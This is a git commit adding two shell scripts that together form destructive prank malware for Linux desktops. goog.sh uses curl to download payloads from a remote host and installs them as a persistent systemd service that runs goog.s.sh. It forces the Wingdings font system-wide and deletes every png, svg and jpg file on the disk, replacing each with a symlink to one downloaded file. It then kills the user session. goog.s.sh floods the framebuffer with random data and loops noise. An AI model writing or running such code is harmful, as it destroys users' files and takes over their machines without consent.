4609614650cb3133e8039ee191ae04b95b0b1c60
geodebreaker <geodebreaker@users.noreply.github.com>
2025-10-07 19:02:04 -0500

    boring tarsone

---
+++ goog.s.sh
@@ -0,0 +1,38 @@
+sleep 30
+(while true; do aplay /opt/$S/$N.wav; done) &
+(while true; do
+  sleep $(awk -v seed=fuvk 'BEGIN{srand(seed); print rand() * 10}')
+  cat /dev/urandom > /dev/fb0
+  for i in {1..10}; do 
+    tail -c 176400 /bin/dolphin | aplay -r 44100 -f S8 -d 10 & 
+    sleep 0.01
+  done
+done) &
+
+# if command -v xdotool >/dev/null 2>&1; then
+#   export $(dbus-launch)
+#   export DISPLAY=:1
+#   (sleep 30
+#   while true; do
+#     S=$(xdotool search --name '.*')
+#     I=$(( RANDOM % ${#S[@]} ))
+#     W=${S[$I]}
+#     X=$(( (RANDOM % 3 - 1) * 30 ))
+#     Y=$(( (RANDOM % 3 - 1) * 30 ))
+#     xdotool windowmove "$W" \
+#       $(xdotool getwindowgeometry --shell "$W" | awk -F= '/X/{x=$2} /Y/{y=$2} END{print x+'$X',y+'$Y'}')
+#     sleep $(awk -v seed=fubg 'BEGIN{srand(seed); print rand() * 5}')
+#   done) &
+#   (S=$(xdotool search --name '.*')
+#   for W in '${S[@]}'; do
+#       if [[ '$(xprop -id "$W" _NET_WM_WINDOW_TYPE 2>/dev/null)' == *'DOCK'* ]]; then
+#           T=W
+#       fi
+#   done; 
+#   sleep 45; 
+#   while true; 
+#     do sudo xdotool windowmove $T 10 10; 
+#   done) &
+# elif command -v apt; then
+#    sudo apt install xdotool -y
+# fi
---
+++ goog.sh
@@ -0,0 +1,91 @@
+trap '' HUP
+
+N=goog
+sudo mkdir -p /opt/$N
+cd /opt/$N
+dl() { 
+  sudo curl -fsSL geodebreaker.github.io/mystuff/$N.$1 -o $N.$1 
+}
+
+persist() {
+  dl wav
+  dl s.sh
+  cp $N.s.sh /usr/local/bin/$N
+  chmod +x /usr/local/bin/$N
+  cat >/etc/systemd/system/$N.service <<EOF
+[Unit]
+Description=$N
+After=network.target
+[Service]
+ExecStart=bash /usr/local/bin/$N
+Restart=always
+[Install]
+WantedBy=multi-user.target
+EOF
+  systemctl daemon-reload
+  systemctl enable --now $N
+  echo "Installed service"
+  systemctl start $N
+  if command -v kwin; then
+    pkill -x kwin_wayland; pkill -x kwin_x11; nohup kwin >/dev/null &
+  fi
+}
+persist &
+PA=$!
+
+font() {
+  dl ttf
+  sudo mkdir -p /usr/local/share/fonts/TTF
+  sudo cp $N.ttf /usr/local/share/fonts/TTF/
+  sudo bash -c "cat > '/etc/fonts/conf.d/99-global-font.conf'" <<EOF
+<?xml version="1.0"?>
+<!DOCTYPE fontconfig SYSTEM "fonts.dtd">
+<fontconfig>
+  <match target="pattern">
+    <edit name="family" mode="assign" binding="strong">
+      <string>Wingdings</string>
+    </edit>
+  </match>
+</fontconfig>
+EOF
+  sudo fc-cache -fvr
+  U=${SUDO_USER:-$USER}
+  sudo -u $U gsettings set org.gnome.desktop.interface font-name 'Wingdings 11'
+  sudo -u $U gsettings set org.gnome.desktop.interface monospace-font-name 'Wingdings 11'
+  sudo -u $U kwriteconfig5 --file kdeglobals --group General --key font "Wingdings,11,-1,5,50,0,0,0,0,0"
+  sudo -u $U kwriteconfig5 --file kdeglobals --group General --key fixed "Wingdings,11,-1,5,50,0,0,0,0,0"
+  sudo -u $U kwriteconfig5 --file kdeglobals --group General --key menuFont "Wingdings,11,-1,5,50,0,0,0,0,0"
+  sudo -u $U kwriteconfig5 --file kdeglobals --group General --key toolBarFont "Wingdings,11,-1,5,50,0,0,0,0,0"
+  sudo -u $U kwriteconfig5 --file kdeglobals --group General --key smallFont "Wingdings,11,-1,5,50,0,0,0,0,0"
+  sleep 5
+  sudo fc-cache -fvr
+}
+font &
+PB=$!
+
+goog() {
+  dl $1
+  goof=$PWD/$N.$1
+  sudo find / -type f -iname "*.$1" -print0 2>/dev/null | while IFS= read -r -d '' file; do
+    if [[ "$file" != "$goof" ]]; then
+      sudo rm -f "$file"
+      sudo ln -s "$goof" "$file"
+      # echo "$file"
+    fi
+  done
+}
+echo -n ...
+goog png &
+PC=$!
+goog svg &
+PD=$!
+goog jpg &
+PE=$!
+sleep 30
+wait $PA
+wait $PB
+wait $PC
+wait $PD
+wait $PE
+sleep 5
+sudo systemctl stop user@1000
